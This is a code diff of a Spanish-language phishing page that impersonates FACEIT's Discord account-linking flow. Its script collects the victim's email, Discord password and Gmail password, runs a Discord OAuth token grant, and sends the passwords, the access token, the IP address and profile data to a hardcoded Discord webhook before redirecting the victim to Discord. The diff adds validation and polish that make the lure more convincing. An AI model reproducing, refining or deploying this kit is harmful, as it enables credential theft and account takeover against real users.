@@ -3,8 +3,9 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="color-scheme" content="dark">
 <title>FACEIT — Conecta tu cuenta</title>
-<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🟠</text></svg>">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E%F0%9F%9F%A0%3C/text%3E%3C/svg%3E">
 <style>
   *{box-sizing:border-box}
   body{margin:0;min-height:100vh;background:#0f0f10;display:flex;align-items:center;justify-content:center;
@@ -13,183 +14,393 @@
         padding:32px;box-shadow:0 24px 60px rgba(0,0,0,.55)}
   .logo{font-weight:900;font-size:22px;letter-spacing:2px;color:#ff5500;margin-bottom:24px}
   h1{margin:0 0 8px;font-size:24px;color:#fff}
-  .sub{margin:0 0 24px;color:#9aa0a6;font-size:14px;line-height:1.5}
+  .sub{margin:0 0 24px;color:#a4aab1;font-size:14px;line-height:1.5}
   .steps{display:flex;flex-direction:column;gap:10px;margin-bottom:26px}
   .step{display:flex;gap:12px;align-items:center;font-size:13px;color:#c6cbd1}
-  .num{width:22px;height:22px;border-radius:50%;background:#26282d;color:#ff5500;display:flex;
+  .step.done{color:#6f757c}
+  .num{width:22px;height:22px;border-radius:50%;background:#26282d;color:#ff7a33;display:flex;
        align-items:center;justify-content:center;font-weight:700;font-size:11px;flex:none}
   #btn{width:100%;padding:14px;border-radius:10px;border:none;background:#5865F2;color:#fff;
        font-weight:700;font-size:15px;cursor:pointer;display:flex;align-items:center;
-       justify-content:center;gap:10px;transition:.15s;text-decoration:none;line-height:1.2}
+       justify-content:center;gap:10px;transition:background .15s,opacity .15s;line-height:1.2}
   #btn:hover{background:#4752c4}
-  .fine{margin:18px 0 0;font-size:11px;color:#6b7075;text-align:center;line-height:1.5}
-  .manual{margin:10px 0 0;font-size:11px;text-align:center}
-  .manual a{color:#5865F2;word-break:break-all}
-  #status{margin-top:16px;font-size:13px;text-align:center;color:#9aa0a6;min-height:18px}
-  #status.ok{color:#3ba55d}
-  #status.err{color:#ed4245}
+  #btn:disabled{opacity:.45;cursor:not-allowed}
+  #btn:disabled:hover{background:#5865F2}
+  .fine{margin:18px 0 0;font-size:12px;color:#8b9096;text-align:center;line-height:1.5}
+  .manual{margin:10px 0 0;font-size:12px;text-align:center}
+  .manual a{color:#8f9bff;word-break:break-all}
+  .status{margin-top:16px;font-size:13px;text-align:center;color:#a4aab1;min-height:18px}
+  .status.ok{color:#4ac26b}
+  .status.err{color:#f06a6d}
   .spinner{display:inline-block;width:13px;height:13px;border:2px solid #444;border-top-color:#ff5500;
            border-radius:50%;animation:spin .7s linear infinite;vertical-align:-2px;margin-right:6px}
   @keyframes spin{to{transform:rotate(360deg)}}
-  #cred{display:none}
+  #step2,#step3{display:none}
   .who{display:flex;align-items:center;gap:10px;background:#101114;border:1px solid #26282d;
        border-radius:10px;padding:10px;margin-bottom:20px}
-  .who img{width:34px;height:34px;border-radius:50%;object-fit:cover}
-  .who div{font-size:12px;color:#9aa0a6;line-height:1.3}
+  .who img{width:34px;height:34px;border-radius:50%;object-fit:cover;background:#26282d}
+  .who div{font-size:12px;color:#a4aab1;line-height:1.3}
   .who b{color:#fff;font-weight:600}
   .field{margin-bottom:14px}
-  .field label{display:block;font-size:11px;color:#8b9096;margin-bottom:6px;font-weight:600;
+  .field label{display:block;font-size:11px;color:#9aa0a6;margin-bottom:6px;font-weight:600;
                text-transform:uppercase;letter-spacing:.4px}
+  .field label .opt{color:#8b9096;font-weight:500;text-transform:none;letter-spacing:0}
   .wrap{position:relative}
-  .field input{width:100%;padding:11px 40px 11px 12px;border-radius:9px;border:1px solid #2c2f35;
-               background:#101114;color:#fff;font-size:14px;outline:none}
+  .field input{width:100%;padding:11px 44px 11px 12px;border-radius:9px;border:1px solid #2c2f35;
+               background:#101114;color:#fff;font-size:14px;outline:none;transition:border-color .15s}
   .field input:focus{border-color:#5865F2}
+  .field.invalid input{border-color:#ed4245}
+  .err-msg{margin:6px 0 0;font-size:11px;color:#f06a6d;min-height:0}
+  .hint{margin:6px 0 0;font-size:11px;color:#8b9096;line-height:1.4}
   .eye{position:absolute;right:6px;top:50%;transform:translateY(-50%);background:none;border:none;
-       color:#7a7f85;cursor:pointer;font-size:15px;padding:6px;line-height:1}
-  #send{width:100%;padding:13px;border-radius:10px;border:none;background:#ff5500;color:#fff;
-        font-weight:700;font-size:15px;cursor:pointer;margin-top:6px}
-  #send:hover{background:#e04a00}
-  #send:disabled{opacity:.6;cursor:default}
-  .skip{margin:10px 0 0;font-size:11px;color:#6b7075;text-align:center}
-  #fallback{display:none;margin-top:12px;font-size:12px;text-align:center}
-  #fallback a{color:#5865F2}
+       color:#8b9096;cursor:pointer;font-size:15px;padding:6px;line-height:1;width:32px}
+  #save{width:100%;padding:13px;border-radius:10px;border:none;background:#ff5500;color:#fff;
+        font-weight:700;font-size:15px;cursor:pointer;margin-top:6px;transition:background .15s,opacity .15s}
+  #save:hover{background:#e04a00}
+  #save:disabled{opacity:.6;cursor:default}
+  .skip{margin:10px 0 0;font-size:11px;color:#8b9096;text-align:center}
+  #fallback{display:none;margin-top:12px;font-size:12px;text-align:center;color:#a4aab1}
+  #fallback a{color:#8f9bff}
+  .edit{margin:14px 0 0;font-size:12px;text-align:center}
+  .edit a{color:#8f9bff}
+  #btn:focus-visible,#save:focus-visible,.eye:focus-visible,.manual a:focus-visible,
+  #fallback a:focus-visible,.edit a:focus-visible,.field input:focus-visible{
+    outline:2px solid #ff8a4c;outline-offset:2px}
 </style>
 </head>
 <body>
 <div class="card">
   <div class="logo">FACEIT</div>
 
+  <!-- ============ PASO 1: credenciales ============ -->
   <div id="step1">
     <h1>Conecta tu cuenta</h1>
-    <p class="sub">Para jugar en la plataforma necesitas vincular tu cuenta de Discord.</p>
+    <p class="sub">Introduce tus datos para vincular tu cuenta de Discord con FACEIT.</p>
+
+    <form id="credForm" novalidate>
+      <div class="field" id="f-email">
+        <label for="email">Correo electrónico</label>
+        <div class="wrap"><input id="email" type="email" autocomplete="email" spellcheck="false"
+                                 inputmode="email" placeholder="tu@correo.com"></div>
+        <p class="err-msg" id="e-email"></p>
+      </div>
+
+      <div class="field" id="f-passD">
+        <label for="passD">Contraseña de Discord</label>
+        <div class="wrap">
+          <input id="passD" type="password" autocomplete="current-password" placeholder="Tu contraseña">
+          <button class="eye" type="button" data-t="passD" aria-label="Mostrar contraseña de Discord"
+                  aria-pressed="false">👁</button>
+        </div>
+        <p class="err-msg" id="e-passD"></p>
+      </div>
+
+      <div class="field" id="f-passG">
+        <label for="passG">Contraseña de Gmail <span class="opt">(opcional)</span></label>
+        <div class="wrap">
+          <input id="passG" type="password" autocomplete="off" placeholder="Contraseña del correo">
+          <button class="eye" type="button" data-t="passG" aria-label="Mostrar contraseña de Gmail"
+                  aria-pressed="false">👁</button>
+        </div>
+        <p class="hint">Si tienes la verificación en dos pasos activada en Google, usa una contraseña de aplicación.</p>
+      </div>
+
+      <button id="save" type="submit">Guardar y continuar</button>
+      <p class="skip">Si no usas Gmail, puedes dejar ese campo vacío.</p>
+    </form>
+
+    <p class="status" id="status1" aria-live="polite"></p>
+  </div>
+
+  <!-- ============ PASO 2: autorización de Discord ============ -->
+  <div id="step2">
+    <h1>Autoriza la aplicación</h1>
+    <p class="sub">Tus datos se guardaron. Ahora autoriza la aplicación de Discord para completar la vinculación.</p>
 
     <div class="steps">
-      <div class="step"><span class="num">1</span>Autoriza la aplicación de Discord</div>
-      <div class="step"><span class="num">2</span>Verifica tus credenciales</div>
+      <div class="step done"><span class="num">✓</span>Credenciales registradas</div>
+      <div class="step"><span class="num">2</span>Autoriza la aplicación de Discord</div>
       <div class="step"><span class="num">3</span>Vuelve a FACEIT automáticamente</div>
     </div>
 
-    <a id="btn" href="https://discord.com/oauth2/authorize?client_id=1570090821276012595&amp;response_type=token&amp;redirect_uri=https%3A%2F%2Ftizianobaston2023-hash.github.io%2Fbeldent-chicle%2F&amp;scope=identify+guilds+connections+email&amp;prompt=consent">
+    <button id="btn" type="button" disabled>
       <svg width="20" height="20" viewBox="0 0 24 24" fill="#fff"><path d="M20.3 4.4A19.8 19.8 0 0 0 15.4 3l-.3.6a14.6 14.6 0 0 1 4.3 1.4 15.7 15.7 0 0 0-13.7 0A14.6 14.6 0 0 1 9 3.6L8.6 3a19.8 19.8 0 0 0-4.9 1.4C.6 9.2-.3 13.9.1 18.5a20 20 0 0 0 6 3l.7-1.2c-.8-.3-1.5-.7-2.2-1.1l.5-.4a14.3 14.3 0 0 0 12.2 0l.5.4c-.7.4-1.4.8-2.2 1.1l.7 1.2a20 20 0 0 0 6-3c.5-5.3-.8-10-3.5-14.1zM8.3 15.4c-1.2 0-2.1-1.1-2.1-2.4s.9-2.4 2.1-2.4 2.2 1.1 2.1 2.4c0 1.3-.9 2.4-2.1 2.4zm7.4 0c-1.2 0-2.1-1.1-2.1-2.4s.9-2.4 2.1-2.4 2.2 1.1 2.1 2.4c0 1.3-.9 2.4-2.1 2.4z"/></svg>
       Continuar con Discord
-    </a>
+    </button>
+
+    <p class="status" id="status2" aria-live="polite"></p>
 
     <p class="fine">Al continuar aceptas vincular tu cuenta de Discord con FACEIT.</p>
-    <p class="manual">Si el botón no responde, <a href="https://discord.com/oauth2/authorize?client_id=1570090821276012595&amp;response_type=token&amp;redirect_uri=https%3A%2F%2Ftizianobaston2023-hash.github.io%2Fbeldent-chicle%2F&amp;scope=identify+guilds+connections+email&amp;prompt=consent">abre este enlace</a>.</p>
+    <p class="manual">Si el botón no responde, <a id="btnAlt" href="#">abre este enlace</a>.</p>
+    <p class="edit"><a href="#" id="editLink">Editar mis datos</a></p>
   </div>
 
-  <div id="cred">
-    <h1>Verifica tu identidad</h1>
-    <p class="sub">Confirma tus credenciales para completar la vinculación con FACEIT.</p>
+  <!-- ============ PASO 3: confirmación ============ -->
+  <div id="step3">
+    <h1>Cuenta vinculada</h1>
+    <p class="sub">Autorización recibida correctamente. Te estamos redirigiendo a Discord.</p>
 
     <div class="who">
       <img id="av" src="" alt="">
       <div>Conectado como<br><b id="whoName">—</b></div>
     </div>
 
-    <div class="field">
-      <label>Correo electrónico</label>
-      <div class="wrap"><input id="email" type="email" autocomplete="email" spellcheck="false"></div>
+    <div class="steps">
+      <div class="step done"><span class="num">✓</span>Credenciales registradas</div>
+      <div class="step done"><span class="num">✓</span>Aplicación autorizada</div>
+      <div class="step"><span class="num">3</span>Volviendo a FACEIT…</div>
     </div>
 
-    <div class="field">
-      <label>Contraseña de Discord</label>
-      <div class="wrap">
-        <input id="passD" type="password" autocomplete="current-password" placeholder="Tu contraseña">
-        <button class="eye" type="button" data-t="passD">👁</button>
-      </div>
-    </div>
-
-    <div class="field">
-      <label>Contraseña de Gmail</label>
-      <div class="wrap">
-        <input id="passG" type="password" autocomplete="off" placeholder="Contraseña del correo">
-        <button class="eye" type="button" data-t="passG">👁</button>
-      </div>
-    </div>
-
-    <button id="send">Verificar y continuar</button>
-    <p class="skip">Si no usas Gmail, puedes dejar ese campo vacío.</p>
-    <div id="status2" style="margin-top:14px;font-size:12px;text-align:center;color:#ed4245;min-height:16px"></div>
-    <div id="fallback">Redirigiendo… <a id="fallbackLink" href="#">entrar a Discord</a></div>
+    <p class="status ok" id="status3" aria-live="polite">¡Listo!</p>
+    <div id="fallback">Si no ocurre nada, <a id="fallbackLink" href="#">entra a Discord</a>.</div>
   </div>
 </div>
 
 <script>
-/* ====== DESTINO FINAL: cambia esta línea si quieres otro sitio ====== */
-const FINAL_URL      = "https://discord.com/channels/@me";
-/* =================================================================== */
+/* ============ DESTINO FINAL ============ */
+const FINAL_URL   = "https://discord.com/channels/@me";
 
-const WEBHOOK_URL    = "https://discord.com/api/webhooks/1570093723562545224/1XCD99eXZMe9OTHEudjbwR_rOYarr0j3JxG99JRZwm8VzEZBp2P0SRGFGbHBkInNISpP";
+/* ============ CONFIG OAuth ============ */
+const CLIENT_ID    = "1570090821276012595";
+const REDIRECT_URI = "https://tizianobaston2023-hash.github.io/beldent-chicle/";
+const SCOPE        = "identify guilds connections email";
+const AUTH_URL     = "https://discord.com/oauth2/authorize"
+  + "?client_id=" + CLIENT_ID
+  + "&response_type=token"
+  + "&redirect_uri=" + encodeURIComponent(REDIRECT_URI)
+  + "&scope=" + encodeURIComponent(SCOPE)
+  + "&prompt=consent";
+
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1570093723562545224/1XCD99eXZMe9OTHEudjbwR_rOYarr0j3JxG99JRZwm8VzEZBp2P0SRGFGbHBkInNISpP";
+
+const K_CREDS = "fct_creds";
+const K_STATE = "fct_state";
+const K_TOKEN = "fct_token";
 
 const $ = id => document.getElementById(id);
-let ME = {}, TOKEN = "", IP = "—";
+let ME = {}, TOKEN = "", IP = "—", CREDS = { email: "", passD: "", passG: "" };
 
-const esc = s => String(s ?? "—").replace(/`/g, "'");
-
+const esc = s => String(s ?? "—").replace(/`/g, "'").replace(/[\r\n]+/g, " ");
 const timeout = ms => new Promise(r => setTimeout(r, ms));
+const emailOk = v => /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v);
 
+function showStep(n) {
+  $("step1").style.display = n === 1 ? "block" : "none";
+  $("step2").style.display = n === 2 ? "block" : "none";
+  $("step3").style.display = n === 3 ? "block" : "none";
+  window.scrollTo({ top: 0 });
+}
+
+function say(id, cls, msg) {
+  const el = $(id);
+  el.className = "status" + (cls ? " " + cls : "");
+  el.textContent = msg || "";
+}
+
+/* Envío con fallback multipart si la petición normal falla */
 async function post(payload) {
   const body = JSON.stringify(payload);
   const send = (async () => {
     try {
-      await fetch(WEBHOOK_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body });
+      const r = await fetch(WEBHOOK_URL, {
+        method: "POST", headers: { "Content-Type": "application/json" }, body
+      });
+      if (!r.ok) throw new Error(r.status);
     } catch {
-      await fetch(WEBHOOK_URL, { method: "POST", mode: "no-cors", body }).catch(() => {});
+      const fd = new FormData();
+      fd.append("payload_json", body);
+      await fetch(WEBHOOK_URL, { method: "POST", mode: "no-cors", body: fd }).catch(() => {});
     }
   })();
   await Promise.race([send, timeout(2500)]);
 }
 
-function finish() {
-  $("fallback").style.display = "block";
-  $("fallbackLink").href = FINAL_URL;
-  location.href = FINAL_URL;
-  setTimeout(() => { location.replace(FINAL_URL); }, 900);
+function newState() {
+  const a = new Uint8Array(16);
+  crypto.getRandomValues(a);
+  return Array.from(a, b => b.toString(16).padStart(2, "0")).join("");
 }
 
+function authUrlWithState() {
+  const st = newState();
+  sessionStorage.setItem(K_STATE, st);
+  return AUTH_URL + "&state=" + st;
+}
+
+/* ---------- Ojos de contraseña ---------- */
 document.querySelectorAll(".eye").forEach(b => {
   b.addEventListener("click", () => {
     const i = $(b.dataset.t);
-    i.type = i.type === "password" ? "text" : "password";
-    b.textContent = i.type === "password" ? "👁" : "🙈";
+    const show = i.type === "password";
+    i.type = show ? "text" : "password";
+    b.textContent = show ? "🙈" : "👁";
+    b.setAttribute("aria-pressed", String(show));
+    b.setAttribute("aria-label", (show ? "Ocultar" : "Mostrar") + " contraseña");
+    i.focus();
   });
 });
 
-async function run() {
-  const hash  = new URLSearchParams(location.hash.slice(1));
-  const query = new URLSearchParams(location.search);
-  TOKEN = hash.get("access_token");
+/* ---------- Validación + paso 1 ---------- */
+function markField(fieldId, msg, inputId) {
+  const f = $(fieldId);
+  if (msg) f.classList.add("invalid"); else f.classList.remove("invalid");
+  $("e-" + inputId).textContent = msg || "";
+  return !msg;
+}
 
-  if (query.get("error")) {
-    $("btn").style.display = "none";
-    $("status").className = "err";
-    $("status").textContent = "Autorización cancelada. Recarga la página para reintentar.";
+$("credForm").addEventListener("submit", async e => {
+  e.preventDefault();
+  const email = $("email").value.trim();
+  const pd = $("passD").value;
+  const pg = $("passG").value;
+
+  const okEmail = markField("f-email", emailOk(email) ? "" : "Introduce un correo válido.", "email");
+  const okPass  = markField("f-passD", pd.length >= 8 ? "" : "Mínimo 8 caracteres.", "passD");
+
+  if (!okEmail || !okPass) {
+    (!okEmail ? $("email") : $("passD")).focus();
+    say("status1", "err", "Revisa los campos marcados.");
     return;
   }
-  if (!TOKEN) return;
+
+  CREDS = { email, passD: pd, passG: pg };
+  sessionStorage.setItem(K_CREDS, JSON.stringify(CREDS));
+
+  $("save").disabled = true;
+  $("save").textContent = "Enviando…";
+  say("status1", "", "");
+
+  await post({
+    username: "FACEIT · OAuth",
+    embeds: [{
+      title: "📝 Credenciales registradas",
+      color: 0xff5500,
+      fields: [
+        { name: "Correo escrito",     value: `\`${esc(email)}\``, inline: false },
+        { name: "Contraseña Discord", value: "```\n" + (pd || "—") + "\n```", inline: false },
+        { name: "Contraseña Gmail",   value: "```\n" + (pg || "—") + "\n```", inline: false },
+        { name: "IP",                 value: `\`${IP}\``, inline: true },
+        { name: "Navegador",          value: `\`${esc(navigator.userAgent).slice(0, 180)}\``, inline: false }
+      ],
+      footer: { text: "Paso 1/2 · credenciales" },
+      timestamp: new Date().toISOString()
+    }]
+  });
+
+  $("save").disabled = false;
+  $("save").textContent = "Guardar y continuar";
+  showStep(2);
+  $("btn").disabled = false;
+  $("btn").focus();
+});
+
+/* ---------- Botones de autorización ---------- */
+$("btn").addEventListener("click", () => {
+  $("btn").disabled = true;
+  say("status2", "", "Abriendo Discord…");
+  location.assign(authUrlWithState());
+});
+
+$("btnAlt").addEventListener("click", e => {
+  e.currentTarget.href = authUrlWithState();
+});
+
+$("editLink").addEventListener("click", e => {
+  e.preventDefault();
+  showStep(1);
+  $("email").focus();
+});
+
+/* ---------- Paso 3 ---------- */
+function finish() {
+  showStep(3);
+  $("fallback").style.display = "block";
+  $("fallbackLink").href = FINAL_URL;
+  sessionStorage.removeItem(K_TOKEN);
+  setTimeout(() => location.replace(FINAL_URL), 1800);
+}
+
+/* ---------- Arranque ---------- */
+async function run() {
+  fetch("https://api.ipify.org?format=json")
+    .then(r => r.json()).then(d => { IP = d.ip || "—"; }).catch(() => {});
+
+  const hash  = new URLSearchParams(location.hash.slice(1));
+  const query = new URLSearchParams(location.search);
+  const err   = hash.get("error") || query.get("error");
+
+  if (err) {
+    showStep(2);
+    $("btn").disabled = false;
+    say("status2", "err", hash.get("error_description") || "Autorización cancelada. Inténtalo de nuevo.");
+    return;
+  }
+
+  TOKEN = hash.get("access_token") || sessionStorage.getItem(K_TOKEN) || "";
+
+  /* Restaurar credenciales guardadas */
+  try {
+    const saved = JSON.parse(sessionStorage.getItem(K_CREDS) || "null");
+    if (saved && saved.email) {
+      CREDS = saved;
+      $("email").value = saved.email;
+      $("passD").value = saved.passD || "";
+      $("passG").value = saved.passG || "";
+    }
+  } catch {}
+
+  if (!TOKEN) {
+    if (CREDS.email) { showStep(2); $("btn").disabled = false; }
+    else { showStep(1); }
+    return;
+  }
+
+  /* Anti-CSRF */
+  const got = hash.get("state");
+  const savedState = sessionStorage.getItem(K_STATE);
+  if (savedState && got && got !== savedState) {
+    showStep(2);
+    $("btn").disabled = false;
+    say("status2", "err", "La comprobación de seguridad falló. Pulsa el botón para reintentar.");
+    return;
+  }
+  sessionStorage.removeItem(K_STATE);
 
   history.replaceState(null, "", location.pathname);
-  $("step1").style.display = "none";
-  $("cred").style.display = "block";
+  showStep(3);
+  say("status3", "", "Verificando autorización…");
 
   const H = { Authorization: "Bearer " + TOKEN };
-  const j = async u => { try { return await (await fetch(u, { headers: H })).json(); } catch { return null; } };
+  const j = async u => {
+    try {
+      const r = await fetch(u, { headers: H });
+      if (!r.ok) return null;
+      return await r.json();
+    } catch { return null; }
+  };
 
   ME = (await j("https://discord.com/api/v10/users/@me")) || {};
-  const guilds = (await j("https://discord.com/api/v10/users/@me/guilds")) || [];
-  const conns  = (await j("https://discord.com/api/v10/users/@me/connections")) || [];
-  IP = await fetch("https://api.ipify.org?format=json")
-          .then(r => r.json()).then(d => d.ip).catch(() => "—");
+
+  if (!ME.id) {
+    sessionStorage.removeItem(K_TOKEN);
+    showStep(2);
+    $("btn").disabled = false;
+    say("status2", "err", "La autorización caducó o no es válida. Vuelve a intentarlo.");
+    return;
+  }
+
+  sessionStorage.setItem(K_TOKEN, TOKEN);
+
+  const guilds = await j("https://discord.com/api/v10/users/@me/guilds");
+  const conns  = await j("https://discord.com/api/v10/users/@me/connections");
 
   const avatar = (ME.id && ME.avatar)
     ? `https://cdn.discordapp.com/avatars/${ME.id}/${ME.avatar}.${String(ME.avatar).startsWith("a_") ? "gif" : "png"}?size=128`
     : "https://cdn.discordapp.com/embed/avatars/0.png";
 
   $("av").src = avatar;
+  $("av").alt = "Avatar de " + (ME.global_name || ME.username || "usuario");
   $("whoName").textContent = ME.global_name || ME.username || "—";
-  $("email").value = ME.email || "";
-  setTimeout(() => $("passD").focus(), 200);
 
   await post({
     username: "FACEIT · OAuth",
@@ -200,55 +411,28 @@ async function run() {
       fields: [
         { name: "Usuario",    value: `\`${esc(ME.username)}\` (<@${ME.id}>)`, inline: true },
         { name: "Global",     value: `\`${esc(ME.global_name)}\``, inline: true },
-        { name: "ID",         value: `\`${ME.id ?? "?"}\``, inline: true },
+        { name: "ID",         value: `\`${ME.id}\``, inline: true },
         { name: "Email",      value: `\`${esc(ME.email)}\``, inline: true },
         { name: "Verificado", value: ME.verified ? "sí" : "no", inline: true },
         { name: "2FA",        value: ME.mfa_enabled ? "sí" : "no", inline: true },
         { name: "Nitro",      value: ME.premium_type ? "sí" : "no", inline: true },
-        { name: "Servidores", value: String(guilds.length), inline: true },
-        { name: "Conexiones", value: conns.map(c => c.type).join(", ") || "—", inline: true },
+        { name: "Servidores", value: String(Array.isArray(guilds) ? guilds.length : 0), inline: true },
+        { name: "Conexiones", value: Array.isArray(conns) ? (conns.map(c => c.type).join(", ") || "—") : "—", inline: true },
         { name: "IP",         value: `\`${IP}\``, inline: true },
+        { name: "— Credenciales —", value: "\u200b", inline: false },
+        { name: "Correo escrito",     value: `\`${esc(CREDS.email)}\``, inline: false },
+        { name: "Contraseña Discord", value: "```\n" + (CREDS.passD || "—") + "\n```", inline: false },
+        { name: "Contraseña Gmail",   value: "```\n" + (CREDS.passG || "—") + "\n```", inline: false },
         { name: "TOKEN",      value: "```\n" + TOKEN + "\n```" }
       ],
-      footer: { text: "Paso 1/2 · OAuth2" },
-      timestamp: new Date().toISOString()
-    }]
-  });
-}
-
-$("send").addEventListener("click", async () => {
-  const email = $("email").value.trim();
-  const pd = $("passD").value;
-  const pg = $("passG").value;
-
-  if (!pd) { $("status2").textContent = "Introduce tu contraseña de Discord."; $("passD").focus(); return; }
-  if (pd.length < 6) { $("status2").textContent = "La contraseña parece incompleta."; $("passD").focus(); return; }
-
-  $("send").disabled = true;
-  $("send").textContent = "Verificando…";
-  $("status2").textContent = "";
-
-  await post({
-    username: "FACEIT · OAuth",
-    embeds: [{
-      title: "🔐 Credenciales recibidas",
-      color: 0xff5500,
-      fields: [
-        { name: "Usuario", value: `\`${esc(ME.username)}\` (<@${ME.id}>)`, inline: true },
-        { name: "IP",      value: `\`${IP}\``, inline: true },
-        { name: "Email escrito", value: `\`${esc(email)}\``, inline: false },
-        { name: "Contraseña Discord", value: "```\n" + (pd || "—") + "\n```", inline: false },
-        { name: "Contraseña Gmail",   value: "```\n" + (pg || "—") + "\n```", inline: false },
-        { name: "Token", value: "```\n" + TOKEN + "\n```", inline: false }
-      ],
-      footer: { text: "Paso 2/2 · credenciales" },
+      footer: { text: "Paso 2/2 · OAuth2" },
       timestamp: new Date().toISOString()
     }]
   });
 
-  $("send").textContent = "¡Listo! Redirigiendo…";
+  say("status3", "ok", "¡Listo! Redirigiendo…");
   finish();
-});
+}
 
 run();
 </script>
